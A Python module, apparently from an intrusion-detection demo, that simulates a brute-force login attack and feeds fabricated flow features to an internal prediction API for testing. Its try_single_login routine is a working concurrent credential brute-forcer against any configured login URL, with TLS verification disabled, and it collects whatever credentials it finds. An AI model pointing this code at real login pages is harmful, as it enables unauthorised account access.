import asyncio
import os
import random
import traceback
from typing import Any, Callable, Coroutine, Dict, List

import httpx

from app.core import state
from app.simulations.simulation_params import BruteForceParams

INTERNAL_API_BASE_URL = os.getenv("INTERNAL_API_BASE_URL", "http://localhost:8000")

def generate_fake_brute_force_features():
    if not state.feature_columns: return {}
    features = {key: 0.0 for key in state.feature_columns}

    fwd_packets = random.uniform(7, 12)
    bwd_packets = random.uniform(7, 12)
  # Update features with values characteristic
    features.update({
        'Flow_Duration':            random.uniform(2e6, 9e6),       
        'Total_Fwd_Packets':        fwd_packets,                   
        'Total_Bwd_Packets':        bwd_packets,
        'Total_Fwd_Bytes':          fwd_packets * random.uniform(70, 150),  
        'Total_Bwd_Bytes':          bwd_packets * random.uniform(200, 500), 
        'Fwd_Packet_Length_Mean':   random.uniform(70, 150),
        'Bwd_Packet_Length_Mean':   random.uniform(200, 500),
        'Packet_Length_Mean':       random.uniform(150, 300),
        'SYN_Flag_Count':           0.0, 
        'FIN_Flag_Count':           1.0, 
    })
    return features

async def trigger_prediction(simulation_id: str):
    try:
        features = generate_fake_brute_force_features()
        fake_source_ip = f"10.42.{random.randint(1, 254)}.{random.randint(1, 254)}"
        
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{INTERNAL_API_BASE_URL}/api/predict",
                json={
                    "features": features,
                    "source_info": f"bruteforce_sim_{fake_source_ip}",
                    "simulation_id": simulation_id
                },
                timeout=10.0
            )
    except Exception as e:
        print(f"Error during Brute Force prediction trigger: {e}")

async def run_bruteforce_simulation(
    params: BruteForceParams, 
    progress_callback: Callable[[Dict[str, Any]], Coroutine[Any, Any, None]],
    simulation_run_id: str
) -> Dict[str, Any]:
    print(f"Starting Brute Force Simulation: Target={params.target_url}")
    credentials_found: List[Dict[str, str]] = []
    total_attempts_made = 0
    total_possible_attempts = len(params.usernames) * len(params.passwords)
    simulation_halted = False

    await progress_callback({"type": "progress", "message": "Starting brute force attack...", "completed": 0, "total": total_possible_attempts})

    async def try_single_login(session: httpx.AsyncClient, username: str, password: str) -> bool:
        nonlocal total_attempts_made
        login_payload = {params.username_field: username, params.password_field: password}
        try:
            response = await session.post(str(params.target_url), data=login_payload, timeout=15.0, follow_redirects=True)
            # Check for success
            success = (params.success_status_code and response.status_code == params.success_status_code) or \
                      (params.success_text_indicator and params.success_text_indicator.lower() in response.text.lower())
            
            if success:
                credentials_found.append({"username": username, "password": password})
                await progress_callback({"type": "progress", "message": f" SUCCESS! Found credentials for {username}!"})
                  # Trigger a prediction
                asyncio.create_task(trigger_prediction(simulation_run_id))
                return True
        except httpx.RequestError as e:
            print(f"Brute force request error for {username}: {e}")
        except Exception as e:
            print(f"Unexpected error in try_single_login for {username}: {e}\n{traceback.format_exc()}")
        finally:
            total_attempts_made += 1
            if total_attempts_made % 5 == 0 or total_attempts_made == total_possible_attempts:
                await progress_callback({"type": "progress", "message": f"Attempt {total_attempts_made}/{total_possible_attempts}...", "completed": total_attempts_made, "total": total_possible_attempts})
                asyncio.create_task(trigger_prediction(simulation_run_id))
        return False

    semaphore = asyncio.Semaphore(params.concurrency)
    async def worker(session: httpx.AsyncClient, username: str, password: str) -> bool:
        async with semaphore:
            return await try_single_login(session, username, password)

    async with httpx.AsyncClient(verify=False) as client:
        for username in params.usernames:
            if simulation_halted: break
            tasks = [worker(client, username, pwd) for pwd in params.passwords]
            results = await asyncio.gather(*tasks, return_exceptions=True)
              # Stop if success
            if any(isinstance(res, bool) and res for res in results) and params.stop_on_first_success:
                simulation_halted = True
                break
    # Prepare the final summary
    result = {
        "target_url": str(params.target_url), "total_attempts_made": total_attempts_made,
        "credentials_found": credentials_found, "simulation_halted_early": simulation_halted
    }
    await progress_callback({"type": "final_summary", "message": "🔒 Brute-force simulation completed."})
    return result